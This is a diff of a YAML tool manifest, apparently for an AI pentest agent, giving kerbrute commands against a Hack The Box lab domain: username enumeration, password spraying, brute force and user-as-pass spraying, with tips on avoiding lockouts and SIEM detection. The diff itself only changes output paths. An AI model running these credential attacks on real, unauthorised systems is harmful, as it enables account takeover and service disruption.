@@ -145,31 +145,31 @@ value_flags:
 
 usage_patterns:
   - name: "userenum — enumerate valid AD usernames against a DC"
-    command: "kerbrute userenum --dc 10.129.242.196 --domain hercules.htb -v -t 10 /session/users.txt -o /session/kerbrute-userenum.txt"
+    command: "kerbrute userenum --dc 10.129.242.196 --domain hercules.htb -v -t 10 /session/output/users.txt -o /session/output/kerbrute-userenum.txt"
     when: "First step in AD enumeration when you have NO credentials. -v is recommended so we capture failure lines (`[!] user@domain - User does not exist`) for parsing. Output `[+] VALID USERNAME: user@realm` lines indicate accounts that returned KDC_ERR_PREAUTH_REQUIRED. Pin -o to /session/ so the log file survives the container exit; stdout is also captured. Feed valid_users into a passwordspray call. Common starter list: administrator, guest, krbtgt, admin, service, sql_svc, web_svc, backup."
 
   - name: "passwordspray — single password vs many users (lockout-safe)"
-    command: "kerbrute passwordspray --dc 10.129.242.196 --domain hercules.htb --safe --delay 250 -v /session/users.txt 'Spring2026!' -o /session/kerbrute-spray.txt"
+    command: "kerbrute passwordspray --dc 10.129.242.196 --domain hercules.htb --safe --delay 250 -v /session/output/users.txt 'Spring2026!' -o /session/output/kerbrute-spray.txt"
     when: "Spray ONE password against many users. Designed to be safer than bruteuser because each user gets ONE attempt per spray round. --safe aborts on first lockout detection (recommended). --delay 250 keeps rate sane; for tighter lockout policies bump to --delay 1000+. Output `[+] VALID LOGIN: user@realm:password` indicates a hit. Run separate calls for each spray password (Spring2026!, Welcome1, Password1, CompanyName1!, etc.) with cooling-off between rounds."
 
   - name: "bruteuser — many passwords vs ONE user (LOCKOUT RISK)"
-    command: "kerbrute bruteuser --dc 10.129.242.196 --domain hercules.htb --safe --delay 500 -v /session/passwords.txt natalie.a -o /session/kerbrute-brute.txt"
+    command: "kerbrute bruteuser --dc 10.129.242.196 --domain hercules.htb --safe --delay 500 -v /session/output/passwords.txt natalie.a -o /session/output/kerbrute-brute.txt"
     when: "Brute-force a single high-value account when lockout policy is known to be DISABLED or VERY LENIENT. Each password attempt counts toward that one account's lockout threshold — DANGER. --safe + --delay are STRONGLY recommended. Note the argument order per `kerbrute bruteuser --help`: PASSWORD list FIRST, then USERNAME (NOT username then list). Use only after passwordspray has failed and lockout policy is confirmed safe."
 
   - name: "bruteforce — username:password combo file"
-    command: "kerbrute bruteforce --dc 10.129.242.196 --domain hercules.htb --safe -v /session/combos.txt -o /session/kerbrute-combo.txt"
+    command: "kerbrute bruteforce --dc 10.129.242.196 --domain hercules.htb --safe -v /session/output/combos.txt -o /session/output/kerbrute-combo.txt"
     when: "Test specific user:pass pairs from credential dumps, OSINT, or password-reuse guesses. Each line is `username:password`. Different from passwordspray (one password, many users) and bruteuser (many passwords, one user) — bruteforce is mixed. WARNING: same username appearing multiple times in the combo file will count toward that account's lockout."
 
   - name: "userenum with delay (stealth / lockout policy unknown)"
-    command: "kerbrute userenum --dc 10.129.242.196 --domain hercules.htb -v --delay 500 /session/users.txt"
+    command: "kerbrute userenum --dc 10.129.242.196 --domain hercules.htb -v --delay 500 /session/output/users.txt"
     when: "Enumerate valid usernames slowly when SIEM detection or rate-based lockouts are a concern. --delay forces single-threaded mode regardless of -t (per kerbrute help). Useful in production engagements where stealth matters; HTB labs can usually skip --delay for speed."
 
   - name: "user-as-pass spray (catch trivial credential reuse)"
-    command: "kerbrute passwordspray --dc 10.129.242.196 --domain hercules.htb --safe -v /session/users.txt --user-as-pass -o /session/kerbrute-uap.txt"
+    command: "kerbrute passwordspray --dc 10.129.242.196 --domain hercules.htb --safe -v /session/output/users.txt --user-as-pass -o /session/output/kerbrute-uap.txt"
     when: "Try each username as its own password (kerbrute's --user-as-pass flag). Catches accounts where the password literally equals the username — surprisingly common for service accounts or temporary staging accounts. NOTE: when --user-as-pass is set, the trailing positional <password> is OMITTED — kerbrute only tests username-as-password. To test BOTH a real password AND user-as-pass, make TWO calls."
 
   - name: "passwordspray with --user-as-pass plus a real password (TWO calls)"
-    command: "kerbrute passwordspray --dc 10.129.242.196 --domain hercules.htb --safe -v /session/users.txt 'Welcome1' -o /session/kerbrute-spray-pwd.txt"
+    command: "kerbrute passwordspray --dc 10.129.242.196 --domain hercules.htb --safe -v /session/output/users.txt 'Welcome1' -o /session/output/kerbrute-spray-pwd.txt"
     when: "Companion to the user-as-pass scenario above. After user-as-pass spray, run a normal spray with a season+year or company-name candidate. Two calls are required because kerbrute's --user-as-pass replaces (not augments) the password argument."
 
   - name: "version / help"
@@ -264,7 +264,7 @@ failure_signatures:
   - signal: "open .* permission denied"
     remediation: "Container can read the directory but not the file. /session/ should be world-writable from the host mount; if a sub-path was created with restrictive perms, recreate it with the `write` tool."
   - signal: "Bad username: blank"
-    remediation: "Wordlist contains an empty line (kerbrute treats it as an invalid username). Filter blank lines from /session/users.txt — `grep -v '^$' users.txt > clean.txt`. The legacy mcp-server.py path filtered these automatically; the kind:cli path requires clean input."
+    remediation: "Wordlist contains an empty line (kerbrute treats it as an invalid username). Filter blank lines from /session/output/users.txt — `grep -v '^$' users.txt > clean.txt`. The legacy mcp-server.py path filtered these automatically; the kind:cli path requires clean input."
   - signal: "unknown flag"
     remediation: "Invalid flag passed to kerbrute. Per `kerbrute --help`, valid global flags are: --dc, --delay, -d/--domain, -h/--help, -o/--output, --safe, -t/--threads, -v/--verbose. passwordspray adds --user-as-pass. There is no --port, --proxy, --hash-file, --realm, or -r flag."
   - signal: "unknown command"
